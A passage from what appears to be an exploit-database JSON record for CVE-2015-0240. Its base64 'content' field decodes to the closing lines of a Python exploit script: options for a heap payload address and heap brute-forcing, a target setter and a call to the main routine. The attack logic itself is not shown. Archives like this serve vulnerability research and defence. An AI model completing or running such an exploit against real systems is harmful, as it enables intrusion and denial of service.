LS1wYXlsb2FkX2FkZHInLCB0eXBlPWhleF9pbnQsIA0KICAgICAgICAgICAgaGVscD0nZXhhY3QgcGF5bG9hZCAoYWNjb3VudE5hbWUpIGFkZHJlc3MgaW4gaGVhcC4gSWYgdGhpcyBpcyBkZWZpbmVkLCBubyBoZWFwIGJydXRlZm9yY2luZycpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctc3BzJywgJy0tc3RhcnRfcGF5bG9hZF9zaXplJywgdHlwZT1pbnQsDQogICAgICAgICAgICBoZWxwPSdzdGFydCBwYXlsb2FkIHNpemUgZm9yIGJydXRlZm9yY2luZyBoZWFwIGFkZHJlc3MgaW4gS0IuICgxMjgsIDI1NiwgNTEyLCAuLi4pJykNCg0KYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCnJlcXVlc3Rlci5zZXRfdGFyZ2V0KGFyZ3MudGFyZ2V0KQ0KDQoNCnRyeToNCiAgICBkb193b3JrKGFyZ3MpDQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgcGFzcw==", 
    "filename": "platforms/lin_x86/dos/36741.py", 
    "id": "36741", 
    "cves": [
        "CVE-2015-0240"
    ]
}